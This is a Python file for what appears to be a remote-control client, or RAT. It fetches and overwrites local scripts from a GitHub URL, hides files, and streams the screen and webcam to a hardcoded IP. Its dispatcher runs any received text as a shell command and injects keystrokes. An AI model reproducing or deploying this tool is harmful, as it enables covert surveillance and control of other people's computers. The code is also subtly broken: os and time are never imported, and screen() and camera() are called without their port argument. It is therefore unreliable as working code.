from file import File
import subprocess
try:
    import easyimporting
except:
    subprocess.Popen("py -m pip install easyimporting", shell=True)
    import easyimporting

listFileDepency = ['scripter.pyw']
hideFile = ["__pycache__"]
githubUrl = "https://raw.githubusercontent.com/N0SAFE/kit-local/main/"

f = File(f"{os.getcwd().replace('\\', '/')}/")
for file in hideFile:
    f.hide(file)
for file in listFileDepency:
    f.modify(file, githubUrl+file)
from fct import *
import sound, scripter
s = sound()

easyimporting.importing("vidstream pyautogui")
from vidstream import ScreenShareClient, CameraClient
import pyautogui

ipScreen = "192.168.1.25"

def camera(port):
    client1 = CameraClient(ipScreen, port)
    client1.start_stream()
def screen(port):
    sender = ScreenShareClient(ipScreen, port)
    sender.start_stream()
    
# esential function
def terminal(command):
    subprocess.Popen(command, shell=True)

def wallpaper(data):
    importImg(data)
    severalcmd('reg add "HKEY_CURRENT_USER\\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d '+getpath()+'\\Image.jpg'+' /f §!§RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True §!§reg add "HKEY_CURRENT_USER\\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d '+getpath()+'\\Imge.jpg'+' /f §!§RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True§!§reg add "HKEY_CURRENT_USER\\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d '+getpath()+'\\Image.jpg'+' /f §!§RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True ')
    
def severalcmd(data, temp=0.05):
    datalist = data.split("§!§")
    for i in datalist:
        print(i)
        terminal(i)
        time.sleep(temp)

def stopall():
    subprocess.Popen(getSelfFileName(), shell=True)

        
def importImg(data):
    import urllib.request
    print(data)
    urllib.request.urlretrieve(data, "Image.jpg")

def cdAccess(cd):
    os.chdir(cd)
    
def write(text):
    pyautogui.write(text)
    
def press(key):
    if key == "winleft":
        pyautogui.press("winleft")
    elif key == "enter":
        pyautogui.press("enter")
    elif key == "tab":
        pyautogui.press("tab")
    elif key[0:10] == "backspace(":
        number = int(key[10:len(key) - 1])
        for i in range(number):
            pyautogui.press("backspace")

def execute(data):
    global run, sortir, ossys, reloading
    datalist = data.split()
    if data == "die":
        run = False
    elif data[0:2] == "cd":
        cdAccess(data[3:len(data)])
    elif data[0:6] == "write(":
        write(data[6:len(data) - 1])
    elif data[0:6] == "press(":
        press(data[6:len(data) - 1])
    elif data == "screen":
        screen()
    elif data == "camera":
        camera()
    elif data == "left":
        print("restart")
        sortir = True  
    elif data[0:4] == "fast":
        scripter.speed_write(data[5:len(data)])
    elif data == "test":
        print("test")
    elif datalist[0] == "severalcmd":
        datalist.pop(0)
        data = " ".join(datalist)
        severalcmd(data)
    elif datalist[0] == "wallpaper":
        datalist.pop(0)
        data = " ".join(datalist)
        wallpaper(data)
    else:
        terminal(data)
